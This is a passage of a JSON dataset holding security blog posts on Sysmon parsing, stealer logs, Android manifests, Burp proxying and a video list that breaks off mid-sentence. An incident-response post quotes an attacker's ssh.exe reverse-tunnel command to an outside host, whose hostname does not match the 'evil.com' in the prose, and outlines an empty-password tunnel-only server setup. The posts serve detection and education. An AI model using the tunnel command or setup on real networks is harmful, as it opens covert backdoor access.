        "output": "Title: \"Parsing Sysmon Logs on Microsoft Sentinel\"\nTaxonomies: \"Blue Team, Blue Team Tools, How-To, Informational, Jordan Drysdale\"\nCreation Date: \"Tue, 07 Mar 2023 19:23:21 +0000\"\nJordan Drysdale //\n\nTl;dr: Many parsers have been written and several are referenced here. This blog describes a simple parser for Sysmon logs through Event ID (EID) 28 for Microsoft Sentinel.\n\nLet's start with a description of the Sysmon schema version. As shown below, the latest schema version as of 23-DEC-22 was 4.83. This will need to be updated in your Sysmon config files if you wish to stay bleeding edge.\n\nThe following blocks include some additions to the version of Sysmon modular generating as of 23-DEC-22. Modular was referenced in a link above, the few lines below allow the writing of Sysmon EIDs 27 and 28 to the operational logs. \n\nBut wait... why am I talking about these things in the Sentinel Sysmon parser's GitHub repo? Hang tight, trust the process, we will get through this. \n\nAs you can see, default download (c:\\users*\\downloads) locations in userland get blocked with the Sysmon EID 27 configuration shown above. This configuration is insufficient for proper usage for modern protective considerations but demonstrates the possibilities. \n\nThis event then gets written to Windows logs. Assuming you are integrated with Microsoft Analytics or Log Analytics agents and are capturing Sysmon logs in your workspace, these logs will be queryable in just a few minutes. \n\nWe can now also restrict file shredding in locations we configure with the config file directives. Scroll back up and check out the <-- EID 28 --> config block. All we restrict is c:\\users*\\Downloads; obviously, this is insufficient. \n\nShown next is an attempt to SDelete (shred) the Firefox installer (pretend this is an adversary trying to cover their tracks). BLOCKED!!!!!!! \n\nThis was also written to the event log. \n\nNow for the actual goods \u2014 what we all came here for. If you want to make your Sysmon logs meaningful in most SIEMs, you need to parse them. There are a few parsers available, and some appear to be well-maintained. The link below was last updated on March 1, 2023, and appears to cover all versions of Sysmon. \n\nMicrosoft Azure Parsers GitHub Repo \u2014 and has a Sysmon parser available. \n\nButtttttttt, here's another one we wrote for our APT class crafted from other bits and pieces available. \n\nAs shown, you want to copy the contents of the parser. \n\nPaste the entire blob into a Sentinel > Logs query window and run it. The query may take a moment. Once complete, click to Save As > Function. \n\nName the function accordingly \u2014 it matters \u2014 because you will be using this to query Sysmon logs in all future queries. As shown, it was named SysmonParser. \n\nFinally, run the function in a new query window by calling SysmonParser() and looking for those couple of event IDs - 27 and 28. \n\nReference Materials:\n\nSysmon - the best system monitor for Windows! Even better than Windows auditing! \n\nOlaf Hartong's Sysmon Modular - The best configuration generator for Sysmon ever shared with the world! \n\nOlaf Hartong's recent article on Sysmon EID 27 - file block executables - and the baseline for getting this written, the parser cleaned up, and pushed to GitHub. \n\nThanks for reading and keep defending out there! \n\n-jd \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Your Browser is Not a Safe Space\"\nTaxonomies: \"Blue Team, Corey Ham, Informational, Red Team, Browser Security, Data Breaches, Malware, Password Managers, Stealer Logs\"\nCreation Date: \"Tue, 14 Mar 2023 04:52:50 +0000\"\nCorey Ham //\n\nTl;dr  \n\nUse a password manager instead of browser storage for passwords, credit card numbers, and other autofill items.  \n\nPersonal security: Do not save anything sensitive in your browser, especially credentials. This data will probably be spread further than you realize, and it can be accessed by malware. Consider deleting all credentials and autofills from your browser of choice.  \n\nEnterprise security: Prevent users from both saving credentials in browser credential stores and consider preventing users from logging into their browsers on enterprise-managed hosts. Enforce access controls that prevent users from signing into browsers on non-managed hosts, if possible. Monitor for credential abuse.  \n\nThe Story  \n\nI do red team engagements for BHIS. These engagements are designed to cover the widest attack surface possible for a target entity. We operate with broad scoping \u2014 meaning we can attack any user, computer, application, or fax machine we identify as owned by the target, unless explicitly provided as out-of-scope ahead of time.  \n\nDuring a recent red team engagement, I gained access to employee credentials, browser cookies, screenshots of a user\u2019s desktop, and some interesting files on the first day of testing. Now, you might be thinking this sounds like a brag about my god-tier hacker skills or that the target had terrible security if I managed to get that far on day one. The truth is, I probably didn\u2019t even have command-and-control infrastructure set up yet, and the target had excellent security. So how did this happen? I found all this data in some Stealer Logs.  \n\nStealer Logs?  \n\nI first became aware of stealer logs at WWHF Deadwood 2022, where I had a great conversation with Mishaal Khan after his talk where he demonstrated using them for OSINT. I\u2019m something of an OSINT fan myself, and the main data breach wrangler at BHIS, so I resolved to get my hands on some of this data and check it out for myself. I eventually managed to get heaps and heaps of it, totaling over 10TB of data. I then worked to process as much of the data as possible to make it searchable. I\u2019ll spare you the boring details of this, but suffice it to say that black hat hackers are absolutely TERRIBLE at organizing files. Let me know if you\u2019d like to see a separate blog post or webcast detailing how I processed the data and made it searchable in our private breach database.  \n\nFor a quick overview of what the logs themselves look like, check out this excellent blog from IntelTechniques (https://inteltechniques.com/blog/2022/07/06/new-breach-data-lesson-ii-stealer-logs/). \n\nA brief overview:  \n\nStealer malware is distributed in a variety of ways, including being packaged with cracked/pirated software, in phishing campaigns, and in malvertising.  \n\nStealers are commodity malware that are cheap ($100), and there are quite a few variants, including Redline, Raccoon, Vidar, and more. Stealers commonly grab the following information from the victim:  \n\nSystem information (running processes, installed software, screenshots) \n\nBrowser data (credentials, history, cookies, autofills, etc.)  \n\nBrowser credential data is generally reported with four fields:  \n\nHost/URL \n\nUsername \n\nPassword  \n\nBrowser version (i.e. Chrome 104)  \n\nInteresting-looking files  \n\nSpecific extractors are built for high-value software, such as cryptocurrency wallets, video games, discord authentication tokens, etc.  \n\nWebcam captures, depending on variant  \n\nThe malware doesn\u2019t stick around for long, but grabs what it can and sends it off to a central server for processing. Once there, each victim\u2019s data is packaged, and the data is sold on forums and telegram groups, often in large collections. They are not particularly expensive, with the average victim\u2019s data costing cents or even fractions of a cent. For reference, a victim\u2019s folder might look something like this:  \n\nThe contents are pretty much self-explanatory. Some variants list what anti-virus programs are present, whether the process is elevated, and what UAC permissions the user has.  \n\nThe screenshots of victim\u2019s desktops are equal parts sad and hilarious. Some of them make me feel like I am way over-engineering my payloads... \n\nThe Victim  \n\nSo. back to the story. \n\nAs you\u2019d probably imagine, reconnaissance is a huge part of a red team. I personally enjoy the recon process, as I use it to gather the situational awareness and confidence I need to execute attacks later on. The more I know about how the target entity operates, the more I can use it against them, especially during social engineering and post-exploitation. After I started processing stealer logs, I added searching for them to my recon workflow on all engagements; specifically, searching for client domains in the host field and username fields. This started turning up results almost immediately, but here\u2019s a specific story that I think illustrates the risks well.  \n\nI discovered a result where one of the captured credentials had a URL like https://citrix.client.com/vpn/login. The username captured for this site appeared to be a valid username, but the password saved was a six digit number. This was likely a temporary MFA code, and we were unable to access the Citrix interface using the captured information. \n\nI extracted and browsed through the user\u2019s entire log folder, which contained roughly 67 sets of credentials but no other information we could leverage for initial access. We launched a long-running credential stuffing campaign targeting this user, using all the credentials listed in the stealer log. Bad for us (but good for the client), this attack was unsuccessful, and we hit smart lockout on that user\u2019s account in all data centers.\n\nOnce we admitted defeat on using the data for initial access, we contacted the client to inform them of the situation, and to have them put us in touch with the victim. I wanted to provide the user with the full stealer log file archive, so they could attempt to invalidate all the information that had been disclosed. However, I was not comfortable with sharing the entire dump with the victim\u2019s employer, given the personal nature of the data. At the same time, our client would not want to be responsible for transmitting and storing the user\u2019s personal data. Eventually, we settled on sending the contents within an encrypted zip file, with the password being verbally exchanged over the phone. The victim was very polite and appreciative of the heads up, which I found admirable.  \n\nThe part that surprised me the most was that the victim had no awareness that their computer was compromised, or even that their data was exposed. I asked if they had received spurious MFA push notifications, suspicious login notifications, or any other indicators of compromise, but they were aware of none. The malware executed over a year before I discovered it during this engagement. This leads me to believe that the attackers that collect this data must triage it and only act against the most valuable targets \u2014 those with credit cards, cryptocurrency wallets, and other information that can lead to quick and direct financial gain.  \n\nAs for how the victim was infected, one of their children managed to infect the family computer while installing cracked software. The victim mentioned to me during our conversation that they would be having a \u201cfamily meeting\u201d to work together to change all the affected passwords, and use it as a teachable moment, which is great. At this point we went our separate ways, and we continued our red team engagement.  \n\nWhat Next?  \n\nAs we concluded the engagement and moved to reporting, I began to consider what the client could do to prevent this kind of thing from happening again.  \n\nFirst, I considered the technical mechanism that led to this data leakage in the first place. I do not have enough evidence to prove exactly what happened, but I thought of some possibilities:  \n\nThe user logged into their work browser with their personal account, causing existing and future credentials to be synced via their personal Google/Microsoft account to their home computer.  \n\nThe user logged into their home computer browser with their work account, syncing all the credentials stored there to their home computer.  \n\n The client uses a bring-your-own-device (BYOD) access model that allows employees to remotely access company resources from personal computers.  \n\nIn all cases, personal and work data would be commingled, leading to potential data leakage.  \n\nTechnical Controls?  \n\nFor years, I have been reporting \u201cbrowser credential storage allowed\u201d as a finding, mainly when we use tools like SharpChromium and SharpDPAPI during post-exploitation, and discover users saving their passwords in browser credential storage as opposed to a password manager. The recommendation there is to use GPO or MDM to fully disable this functionality in all browsers. There is a possibility that this would have prevented the user from saving the password in the first place, if they only ever logged into the Citrix interface from a managed computer.  \n\nThis situation brought up the possibility of an additional recommendation, which is to prevent users from signing into their browsers at all. While I considered this, it could reduce the efficiency of some workers that switch between approved devices often. It also is the kind of security solution that I hate \u2014 one that blocks a bunch of useful features to prevent a subset of them from being abused.  \n\nUser Security Awareness?  \n\nAs much as I hesitate to pull this lever so often, I think making users aware of the implications of browser sync is helpful for the employee and the employer. This goes way beyond security; I think most people would not want their browser history shared with their spouse or close friends, let alone their employer. As more applications move to the web client model, we put more sensitive data into our browsers than ever before.  \n\nDetection?\n\nAlthough breached data might seem outside of our control, monitoring and detection can prevent this data from being abused.  \n\nKnowing exactly what data is breached in the first place goes a long way, both for companies and individuals. At the time of writing, there is no public site I am aware of that is like HaveIBeenPwned but for stealer logs. If you know of a good one, please get in touch.  \n\nFor companies, there are likely paid data breach monitoring services that ingest stealer logs. You could also subscribe to our Continuous Testing offering, which is structured in a way that allows us to use these techniques long-term just like real attackers do (shameless plug).\n\nFor individuals, searching for your data in stealer logs is more difficult. There is a government website (https://raccoon.ic3.gov/home) that will allow you to determine if your data was stolen by Raccoon Stealer. HaveIBeenPwned has roughly 400,000 records from the Redline stealer, which is a limited subset. Currently, my dataset contains close to 10 million victims, and I am likely missing quite a bit of data.  \n\nCompanies should also monitor for credential stuffing attacks and respond accordingly, especially if a valid login occurs. Defenders should also be aware of the security implications of browser data.  \n\nMy Advice  \n\nUse good password manager, for both enterprise and personal security.  \n\nDisable browser credential storage for all browsers on all managed computers using Group Policy or Device Management tools like Intune. \n\nClean up previously saved logins and other sensitive data.  \n\nEducate users and defenders:  \n\n Bring awareness to the amount of data exchanged when signing in to a browser.\n\nDemonstrate how to manually disable credential storage, export old credentials, and import them into a password manager of their choice . \n\nThanks for reading! \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Ssh Dont Tell Them I Am Not HTTPS: How Attackers Use SSH.exe as a Backdoor Into Your Network\"\nTaxonomies: \"Blue Team, C2, Derek Banks, Hunt Teaming, Incident Response, Informational\"\nCreation Date: \"Tue, 21 Mar 2023 15:55:46 +0000\"\nDerek Banks // \n\nLiving Off the Land Binaries, Scripts, and Libraries, known as LOLBins or LOLBAS, are legitimate components of an operating system that threat actors can use to achieve their goals during a campaign against your organization. They do this to try to avoid detection from endpoint protection products and as an alternative to writing custom malicious code. \n\nCredit (original art): Locust Years\n\nIn many cases these binaries are well known, the techniques documented, and (hopefully) the malicious use is detectable by security products or threat hunting processes. However, in a recent incident response engagement, we found a LOLBAS technique that did not fall in that category of well documented. In fact, the technique does not currently appear to be in the MITRE ATT&K framework. \n\nThe scenario was that the client had users report odd behavior on their laptops. There were fraudulent purchases made on personal accounts from their work system when they were not at work at the time.  When initially investigating, the client determined that there were Remote Desktop Protocol (RDP) connections from their domain controllers to the endpoints in question. Understandably, the client became very concerned and contacted BHIS for Incident Response assistance. \n\nWe deployed Velociraptor in the environment and started analyzing network connections to the internet. We found that on a handful of Windows servers, there was a very suspicious Secure Shell (SSH) command connected to an external IP address. \n\nBut wait! SSH on a Windows server? Isn\u2019t that a Linux thing?   \n\nWe have found on both penetration tests and incident response engagement that many still do not realize the impact of the decision Microsoft made in 2018 to include OpenSSH in Windows Server and Desktop OSes. \n\nThe old systems administrator in me likes the decision and thinks, \u201cit\u2019s about time I do not need a third party SSH client.\u201d But the security analyst in me knows that SSH is an amazingly powerful and versatile tool. Threat actors know its power and versatility too. It is more capable than just logging in to a remote server and interactively running commands. \n\nTake the command we found during this incident investigation for example: \n\nssh.exe sshtunnel@blackhillsinfosec.com -f -N -R 50000 -p 443 -o StrictHostKeyChecking=no \n\nIn this SSH command, the attacker was establishing a SSH connection to the remote server at evil.com with a very specific intent in mind \u2014 a reverse tunnel into the victim network so that they can run their own commands against internal systems. This is accomplished with the flags used in this particular command: \n\n-f: The SSH command runs in the background. Used by the attacker to obfuscate their presence.   \n\n-N: Do not execute a remote command. This is useful when just forwarding ports.\n\n-R: Specifies that the given port on the remote host is to be forwarded to the local host and port on the victim network. This works by allocating a socket to listen to a port on the remote side and whenever a connection is made to this port, the connection is forwarded over the secure channel and a connection is made to victim machine.  This makes it a SOCKS proxy. \n\n-p: The port used to connect outbound from the internal network to the remote host, in this case, TCP 443, commonly associated with HTTPS, not SSH. \n\n-o: Options for which there is no specific command line switch, in this case StrictHostKeyChecking=no.\n\nThe StrictHostKeyChecking=no option is used so that when the command is run, the SSH client does not ask to verify the server host key\u2026 you know, that message we all just answer \u2018yes\u2019 to when connecting to an SSH server. But why would the attacker do this? \n\nThey wanted to avoid that interactive prompt in a new SSH command from a new host because of persistence. There was a scheduled task that ran a batch file stored in C:\\Windows\\Temp that was similarly named to a valid Windows DLL. \n\nSome of you may be thinking, \u201cWhat about the password prompt?\u201d when SSH connects. Others may be thinking that the attackers solved that interactive password prompt by dropping an SSH private key on the system\u2026 That is what I thought too.   \n\nHowever, there was not a private key to be found on any of the compromised hosts. This really made me curious; how could that be possible\u2026 could it really be no password to authenticate? That would not be a good choice for an attacker to make.  After some sciencing in the lab, it turns out that the answer is: sort of\u2026 \n\nOpenSSH server allows configuration for a tunnel only user, in that a specific user account can be set up to not receive a shell when authenticating. In the server-side configuration, the following option in the sshd_config file sets up a tunnel only user. \n\nAdditionally, the SSH tunnel only user needs to have an empty password. This can be accomplished with the passwd command with the -d switch.   \n\nThe last configuration piece to allow the tunnel only user to connect is to add \u2018ssh\u2019 to the /etc/securetty file. This is necessary for allowing a user with an empty password to login over SSH. \n\nThis configuration will not allow the tunnel only user (sshtunnel) to connect and establish a shell or run commands on the remote server, but only establish a connection that sets up the reverse proxy type configuration. \n\nWhat can an attacker do with this? In many ways, it\u2019s analogous to plugging a computer physically into the network. Making the assumption that there are compromised domain credentials, which is likely to make it to the point of setting up SSH in this manner, you can do pretty much whatever you need to accomplish your nefarious objectives.   \n\nFor example, you can proxy RDP through SSH to connect to systems that the compromised credential has access to. One of the things I like to do on penetration tests with proxy access similar to this, is use proxychains and Python utilities like Impacket and Python Bloodhound to attempt to avoid host-based detection. \n\nHow do you detect and prevent this from happening to your network? One of the most common things we see in Incident Response and Penetration Test clients is the lack of sufficient egress network traffic filtering from the local network to the internet.   \n\nIf you have an application layer firewall (most firewalls these days probably are), you can prevent a successful SSH connection on an off port by configuring it so that only the expected application traffic can use the associated port. For example, only HTTPS traffic can use TCP 443; SSH cannot.   \n\nIn addition, it would work to implement a deny rule for any TCP ports you do not use for business purposes. If there are ports that are limited use, like TCP 22 for SSH, and only a few systems administrators need to use it, limit the port to those individuals as an exception. \n\nThere are some good detection opportunities here as well. The specific SSH flags in use here are not common for normal systems administration. Alerting on the use of those flags from the command line across your environment should generally be a high-fidelity alert. \n\nFrom a threat hunting perspective, you could take a look at all of the known_hosts files in the environment. When SSH connects to a host on a port that is not TCP 22, it will put brackets around the host name. In most environments, brackets in a known_hosts file should be considered suspicious.   \n\nPlease note: the screenshot above is an example known_hosts file and obviously does not contain the atomic indicators (IP address and host name) from the incident. Those are not shared publicly, but if you are a BHIS SOC customer, you already have detection and active threat hunting for this threat actor. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Got Enough Monitors?\"\nTaxonomies: \"Carrie Roberts, General InfoSec Tips & Tricks, Informational\"\nCreation Date: \"Tue, 28 Mar 2023 15:30:00 +0000\"\nCarrie Roberts // Guest Blog\n\nOK, I admit it: I might have a problem. But seriously, can you ever really have enough screen space? In this blog post, I'll describe a cheap solution for having a lot of screen space for your work-from-home office. I will also share other aspects of my office that make it functional and enjoyable (links are included if you are interested in imitating any of it).\n\nI\u2019m using five 43\u201d 4K televisions as monitors for my work-from-home office. Each TV is less than $200, and they work great for everything I do \u2014 from viewing Office documents to joining Zoom meetings. I\u2019m not a graphic designer, I'm clueless about color accuracy, and I don\u2019t play games where you would most likely notice issues using TVs as monitors.\n\nI have two computers hooked up to these five monitors. The screen in the middle is hooked to an HDMI switch for easy switching back and forth between my work computer and my personal computer, depending on what I am focusing on at the time. The two monitors on the left are always hooked up to my work computer, and the two monitors on the right are always hooked up to my personal computer. It is important to switch the middle monitor with the switch instead of the TV\u2019s input switcher, because windows will hide on the invisible screen using the TV\u2019s input switcher. I like to use the upper monitors for things like keeping an eye on my calendar, email, messaging apps, and as one consistent place for controlling my music.\n\nI recommend setting your mouse pointer options to move \u201cfast\u201d so that you can get to all edges of your monitors in one wrist motion without having to lift up your mouse. It takes some adjustment to get used to, but then is easily doable. Sometimes you lose track of where the mouse pointer is on the screen and it is hard to find. On macOS, you can quickly move the mouse pointer back and forth and the pointer will show up much larger for a second so you can find it (go to Settings\u2192Accessibility\u2192Display\u2192Pointer to customize). On Windows, this option works well.\n\nOn my personal computer, I use the free Microsoft FancyZones tool to break the screen up into any layout I want and easily snap my windows to the layout. I recorded a demo of it here. My monitors are very close to the ceiling because I have a raised desk to allow for the treadmill underneath, but that\u2019s another story.\n\nI record a lot of content for online training, so I\u2019ve doubled up on my webcams and microphones so that I don\u2019t have to switch them back and forth between my work and personal computers. I had a USB switch originally, but I ruined two Yeti Nano microphones and two USB switches doing that. I don\u2019t think they are built for that kind of switching.\n\nYou also see that my personal computer is on a stand in the middle and one of my cameras is on an adjustable arm. This is so I can present from a 1080p monitor and lower the camera, so it looks like I am looking into the camera more. (If I didn\u2019t record so much content, I wouldn\u2019t go through so much trouble.)\n\nOf course, I want to be able to switch my keyboard and mouse back and forth between the two computers, but the 1-2 second delay on all the switches can be annoying when I just want to skip a song or respond to a message with an emoji on my personal computer. For this reason, I keep one mouse for each computer by my keyboard. I don\u2019t switch the keyboard between computers nearly as much, so I just use this cheap multi-computer keyboard. I do have a mouse that can switch between 3 computers easily but not fast enough for me, so I prefer two different mice.\n\nFor my recordings and online meetings, I wanted to have something cool in the background, so I built this Wonderstructs marble maze and I love it! It looks deceptively small in the picture, but it is 6 ft tall x 10.5 ft wide and takes up the entire wall.\n\nI use two LED wall washer lights to give it the color. You can see them mounted just under my desk on the left and right in the photo with the monitors. I also use two studio lights to allow me to have consistent lighting, day and night, for my recordings. The lights are also shown in the monitor picture on the outside of the upper monitors. The lights are wirelessly connected, and I can control their brightness and color from an app on the computer, as well as on my phone.\n\nSome other things I enjoy in my office are a booming stereo system, a multi-port usb charging station, this super comfy swinging chair, my under-desk treadmill, this wall mounted coat rack, a mega powerstrip, and this 100 oz jug full of diet coke!\n\nIt takes a very large desk to house this much screen real estate because the screens are ideally set back a fair distance from your face. My center screen is 3 feet away from my face. The desk itself is made from a sheet Melamine and is 3.5 ft x 8ft.\n\nIf you do decide to try these TVs for monitors, remember to set your display settings from your computer to 30 Hz and to play with the TV settings (press * on the remote) and try the different picture modes to see which you like best. I had a couple of TVs where the text on the screen didn\u2019t look sharp until I changed the mode. Some cables, dongles, and docking stations don\u2019t support 4K and will limit your resolution on these TV\u2019s. You may need to buy a few HDMI to USB-C cables to hook the TVs up directly to your computer. And remember, you must get the 4K version of the TV or life will not be good.\n\nGood Luck!! I\u2019ve been working from these monitors for 4 years and I\u2019m very happy with them.\n\nCheck out a related blog of Carrie's: Healthy Hacking with the Treadmill Elliptical Desk\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Field Guide to the Android Manifest File\"\nTaxonomies: \"Cameron Cartier, Informational, InfoSec 101, Mobile, Android, android hacking, Android Security, Application Security, hacking, reverse engineering, security\"\nCreation Date: \"Thu, 06 Apr 2023 16:16:04 +0000\"\nCameron Cartier // \n\nEvery Android application has a \u201cmanifest.xml\u201d file located in the root directory of the APK. (Remember APKs are just zip files.) The manifest file is like a guide to the application. It describes all of the components of the app, the application permissions, and the required hardware/software features. Developer misconfigurations to this file \u2014 for example, marking an activity as exported \u2014 can have serious effects on the application's security. Many static analysis tools (i.e., MobSF) get a lot of their information by simply parsing this file.\n\nIn this blog, we are going to walk through a sample of the fun things you can learn from an apps manifest file as a hacker. We will be using the monolithic social media app \"TikTok\" for this analysis. \n\nNow, lets have some fun. \n\nThe manifest file is in \u201cbinary xml\u201d format. This means that if you unzip the APK file, you will see that manifest.xml is mostly undecipherable.\n\nTo fix this, we decompile the app with Apktool instead.\n\nApktool Command: apktool d app.apk\n\nThis may take a few minutes since we are using a large app. Now opening the manifest file in a text editor shows us the human-readable version (depending on your definition of human-readable that is).\n\nThe first thing worth noting is the package name.\n\npackage=\"com.zhiliaoapp.musically\"\n\nThis is what is used by the operating system to identify your app. It also tells you the app's internal storage location. Apps store their data (cache, databases, etc.) at /data/data/. You can also determine if the app shares a sandbox with any other applications. If the app does share a user ID, it will have the entry android:SharedUserId=. For example, many system applications will share android.uid.system (IID 1000). This allows them to share data and operate with higher permissions than user-installed apps.\n\nIn older applications, the manifest file will include the minimum and maximum Android SDK versions. As of Android 11, this is no longer allowed, and these must be declared in the Gradle files instead.\n\nThere are also a set of flags that allow/disallow actions on the application. Here are two you should pay attention to as a tester, as they can be dangerous:\n\nAndroid:Allowbackup = \"true\" This allows anyone with access to the device to make a copy of all of the application's data. An example of when this could be dangerous is if an adversary with device access is able to download un unencrypted database.\n\nAndroid:Debuggable = \"true\" Apps should never be released with the debuggable flag set to true. This can lead to sensitive information exposure. It can also allow an attacker with device access to run arbitrary code using the applications permissions.\n\nPermissions\n\nThe manifest file is also required to specify which components of the device the app can interface with. The user decides whether to grant the application these permissions at runtime. An application cannot access any external features of the device unless it is explicitly declared with a tag. Knowing what permissions an app is likely to have access to can be useful to an attacker when paired with another vulnerability that allows for code execution under the app's user. As a security tester, you want to call out any permissions that seem unnecessary. Which permissions are necessary depends on the specific application.\n\nHere is a small subset of the permissions requested by the TikTok app:\n\n \"android.permission.SYSTEM_ALERT_WINDOW\"/>\n \"android.permission.REORDER_TASKS\"/>\n \"android.permission.INTERNET\"/>\n \"android.permission.ACCESS_NETWORK_STATE\"/>\n \"android.permission.READ_EXTERNAL_STORAGE\"/>\n \"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n \"android.permission.ACCESS_WIFI_STATE\"/>\n \"android.permission.CAMERA\"/>\n \"android.permission.RECORD_AUDIO\"/>\n \"android.permission.FLASHLIGHT\"/>\n \"android.permission.WAKE_LOCK\"/>\n \"android.permission.GET_TASKS\"/>\n \"android.permission.READ_CONTACTS\"/>\n \"android.permission.RECEIVE_BOOT_COMPLETED\"/>\n \"android.permission.VIBRATE\"/>\n \"30\"\nandroid:name=\"android.permission.BLUETOOTH\"/>\n \"com.meizu.c2dm.permission.RECEIVE\"/>\n \"com.zhiliaoapp.musically.permission.READ_ACCOUNT\"/>\n\nIn addition to permissions, there is also the tags. Each of these declares a hardware or software feature the application requires to function properly. The requires=\"true\" means the app will not be able to run in an environment without that feature present (i.e., bluetooth capability). The Google Play Store may filter out applications requiring features the user's phone does not have.\n\nApplication Components\n\nAn application is required to have a manifest entry for each of its components. These include activities, services, content providers, and broadcast receivers. Similar to public/private classes in object-oriented languages, each individual instance of one of these can be exported or not exported. If the exported flag is set, it can be accessed from other apps as well.\n\nFirst, let's talk about activities. Each activity will be declared with an tag in the manifest file.\n\nActivities are activated by \u201cintents\u201d (as are services and broadcast receivers). The intent is passed to the system, and the system determines which component of the app can handle the intent using the intent filters. These filters are declared in the manifest with \u201cintent-filters.\u201d\n\nBy declaring intent filter(s) for an activity, you make it possible for other apps (or the system) to launch your application.\n\nEvery app will have an activity with an intent-filter block that looks very similar to the following code block:\n\n \"android.intent.action.MAIN\" />\n \"android.intent.category.LAUNCHER\" />\n\nThis indicates the entry point of the application. The line android.intent.category.LAUNCHER says to the app, \"When the user clicks the icon for this app, launch this activity.\" Figuring out where the app starts is a good first step in reverse engineering.\n\nAbove shows the entry point for the TikTok app.\n\nAnother thing you would want to look for as a tester is exported activities. An activity is exported if either they have the android:exported attribute set to \"True\", OR they have an block and the exported attribute is unset.\n\nServices differ from activities in that they do not have a UI component and are often used to run background tasks. Otherwise, all the rules above still apply.\n\nLooking at the intent filters can also give us clues as to the function of an component. Take this service from the TikTok app for example:\n\n\"true\"\n android:name=\"com.heytap.msp.push.service.DataMessageCallbackService\"\n android:permission=\"com.heytap.mcs.permission.SEND_PUSH_MESSAGE\">\n \n \"com.heytap.mcs.action.RECEIVE_MCS_MESSAGE\"/>\n \"com.heytap.msp.push.RECEIVE_MCS_MESSAGE\"/>\n \n\nFrom just the manifest entry and some quick Google searches, without looking at the source code, we can tell that this service is responsible for handline Android push notifications.\n\nFurther Research\n\nIf you really want to take a deep dive into how the android manifest works, the Android Developers Reference is a great place to start: https://developer.android.com/guide/topics/manifest/manifest-element\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Genymotion - Proxying Android App Traffic Through Burp Suite  Cameron Cartier\"\nTaxonomies: \"Informational\"\nCreation Date: \"Fri, 07 Apr 2023 16:51:47 +0000\"\n\nhttps://www.youtube.com/embed/aqqdy7460yo\n\nMobile App Testing is a category showing no signs of slowing down. In this video, BHIS tester Cameron Cartier walks us through linking Genymotion to Burp Suite for traffic monitoring. \n\nIncluded below are the commands referenced in the video.\n\nGeneral\n\nList devices: \n\nAdb devices -l \n\nConnect to the listed device:\n\nAdb connect :\n\nGo to shell on connected device:\n\nAdb shell\n\nOpenssl Commands for Converting the Burp Cert\n\nopenssl x509 -inform DER -in burp.cer -out burp.pem\n\nopenssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1\n\nmv burp.pem 9a5ba575.0\n\nadb root\n\nadb remount\n\nadb push 9a5ba575.0 /sdcard/\n\nadb shell\n\nmv /sdcard/9a5ba575.0 /system/etc/security/cacerts/\n\nchmod 644 /system/etc/security/cacerts/9a5ba575.0\n\nPointing Genymotion at Burp\n\nadb shell settings put global http_proxy localhost:\n\nadb reverse tcp: tcp:\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Shenetworks Recommends: 9Must Watch BHIS YouTube Videos\"\nTaxonomies: \"General InfoSec Tips & Tricks, Informational, Serena DiPenti, Pentesting\"\nCreation Date: \"Thu, 13 Apr 2023 16:30:00 +0000\"\nshenetworks //\n\nThe Black Hills Information Security YouTube channel has over 400 videos available. Over the past year, I have attended many webcasts and explored plenty of the videos. I put together this list to highlight videos that have helped me on my penetration testing journey. If you are interested in expanding your knowledge related to pentesting, I recommend starting with these.  \n\nGetting Started with Burp Suite & Webapp Pentesting \u2013 BB King \n\nhttps://www.youtube.com/embed/xKudsnN3gkE\n\nOf course, we must start with Burp Suite presented by the master, BB King. Burp is an essential \u2014 and an incredibly valuable \u2014 tool for webapp and API pentesting. Burp has a TON of useful features, but it can be a little overwhelming to parse through and find which features will be most valuable to you. Tabs like intruder, repeater, sequencer, comparer\u2026 Are they different?? (yes). BB\u2019s video covers the installation of Burp and an overview of the tool\u2019s features.  \n\nBonus: For more Burp related content, check out \u201cBasics of Burp(ing) for Testing Web App Security\u201d by Chris Traynor - https://www.youtube.com/watch?v=Gb7OQm5-Xdw \n\nPentester Tactics, Techniques, and Procedures TTPs \u2013 Chris Traynor \n\nhttps://youtu.be/mtAcfEWOoJI\n\nChris\u2019s video is a really great place to start if you\u2019re new to pentesting. Chris goes over terminology and essential tools like NMAP, Recon-ng, Burp, and a few Burp extensions. Chris also covers tactics like account enumeration, password spraying, and smb_login.  \n\nSecuring AWS Discover Cloud Vulnerabilities via Pentesting Techniques \u2013 Beau Bullock \n\nhttps://youtu.be/fg_hey18tio\n\nThe cloud... everyone has heard of it and most of us have used it in some capacity. At some point in your pentesting career, you will be given assets in the cloud. Beau\u2019s video covers a wide range of topics such as AWS authentication, initial access, public accessibility of resources, post-compromise recon, and more.  \n\nHow to Build a Phishing Engagement \u2013 Coding TTP\u2019s \u2013 Ralph May \n\nhttps://youtu.be/VglCgoIjztE\n\nPhishing attacks are a common request for any pentesting company. It is helpful to understand the work behind crafting a phishing campaign and the tools available. Ralph goes into detail on some of the common phishing pitfalls and tools you can use to create a successful campaign. \n\nThis video covers infrastructure, designing a phish, and an overview of different phishing tools available.  \\\n\nShellcode Execution with GoLang \u2013 Joff Thyer  \n\nhttps://youtu.be/gH9qyHVc9-M\n\nJoff compares offensive GoLang to other popular languages and discusses executing shellcode on Windows. As a pentester, you will quickly get familiar with shellcode from various sources like msfvenom, but it is valuable to learn to create your own shellcode. This video provides a good, broad overview of Golang and discussion on writing malware with embedded shellcode.  \n\nCoercions and Relays - Gabriel Prud'homme \n\n https://youtu.be/b0lLxLJKaRs\n\nCoercions and relays is one of my favorite topics. This is an extremely valuable and often successful technique to steal credentials and access. Gabriel discusses network protocol vulnerabilities and tools available to exploit these vulnerabilities. This video covers responder, IPv6 Poisoning, DHCP poisoning, DA privilege Escalation, and SO MUCH MORE. \n\nHow to Attack When LLMNR, mDNS, and WPAD Attacks Fail - Eavesarp (Tool Overview) - John Strand \n\nhttps://youtu.be/cKDdy0JFXpA\n\nOn occasions you have no success with other relay attacks, you still have other options. ARP is the protocol that helps discover which mac address belongs to a specific IP (Internet Protocol) address. Internal infrastructure changes over time, and it often leaves behind stale configuration. ARP requests can be sent out looking for hosts that no longer exist. Stale configurations can be abused by attackers. This video provides an in-depth explanation and tools available to use.\n\n(Eavesarp written by Justin 